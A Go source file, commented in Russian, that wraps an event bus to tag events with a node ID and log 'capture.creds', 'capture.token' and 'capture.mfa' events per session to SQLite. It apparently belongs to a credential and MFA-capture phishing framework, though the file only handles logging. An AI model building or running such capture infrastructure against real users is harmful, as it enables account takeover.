package events

import "context"

// CapturesDB — минимальный интерфейс персистентности (реализация storage/sqlite).
type CapturesDB interface {
	InsertCaptureNode(sessionID, kind, node string) error
}

// Persistent — Bus + запись фактов захватов в SQLite (без plaintext).
// Ошибки DB не глушатся молча: уходят в OnError (main wires log).
// NodeID подмешивается в payload и запись (мульти-нода).
type Persistent struct {
	Inner   *Bus
	DB      CapturesDB
	NodeID  string
	OnError func(error)
}

func (p *Persistent) Publish(ctx context.Context, topic string, payload any) error {
	// node_id во все map-события (bot.blocked тоже видно с какой ноды).
	if p.NodeID != "" {
		if m, ok := payload.(map[string]string); ok {
			if _, has := m["node"]; !has {
				cp := make(map[string]string, len(m)+1)
				for k, v := range m {
					cp[k] = v
				}
				cp["node"] = p.NodeID
				payload = cp
			}
		}
	}
	if p.DB != nil {
		var kind, sess string
		switch topic {
		case "capture.creds":
			kind = "creds"
		case "capture.token":
			kind = "token"
		case "capture.mfa":
			kind = "mfa"
		}
		if kind != "" {
			if m, ok := payload.(map[string]string); ok {
				sess = m["session"]
				if k, ok := m["kind"]; ok && k != "" {
					kind = kind + ":" + k
				}
			}
			if sess != "" {
				if err := p.DB.InsertCaptureNode(sess, kind, p.NodeID); err != nil && p.OnError != nil {
					p.OnError(err)
				}
			}
		}
	}
	return p.Inner.Publish(ctx, topic, payload)
}
